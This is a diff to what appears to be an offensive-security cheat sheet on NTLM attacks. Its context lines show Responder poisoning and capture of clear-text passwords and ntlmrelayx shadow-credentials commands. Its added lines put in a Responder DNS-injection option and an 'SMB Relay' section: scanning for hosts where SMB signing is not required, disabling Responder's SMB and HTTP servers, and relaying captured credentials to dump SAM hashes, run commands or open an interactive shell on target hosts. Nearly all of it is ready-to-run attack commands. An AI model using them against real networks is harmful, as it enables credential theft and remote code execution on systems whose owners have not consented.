@@ -10,6 +10,8 @@ responder -I eth0 -A
 responder -I eth0 -wdF -b #get clear text password , in victum browser run fun.local
 responder -I eth0 -e 192.168.1.2
 responder -I eth0 -wdF --lm --disable-es
+responder -I eth0 -D  #dns injection
+
 ```
 
 using metasploit capture:
@@ -67,4 +69,25 @@ ntlmrelayx.py -t ldaps://<DC_IP> --shadow-credentials
 ntlmrelayx.py -tf targets.txt -l loot/
 ntlmrelayx.py -t ldaps://<DC_IP> --http-port 80 --no-smb-server
 
+```
+
+
+#### SMB Relay :
+```bash
+sudo nmap --script=smb2-security-mode.nse -p445 192.168.154.0/24
+#Look for any host have this "Message signing enabled but not required"
+#add to targets.txt
+
+#Responder:
+#edit this file and change SMB=off and HTTP=off
+sudo vi /etc/responder/Responder.conf 
+
+#run impacket script
+impacket-ntlmrelayx -tf targets.txt -smb2support #dumphash
+impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami" #command
+impacket-ntlmrelayx -tf targets.txt -smb2support -i #interactive terminal
+
+#point victum machine to attacker machine somehow ,
+
+#impacket script relay to targets.txt hosts , if the captured credentials have #valid account in relayed hosts with "Administrative privileges" then we dump #sam local hash or perform other action.
 ```
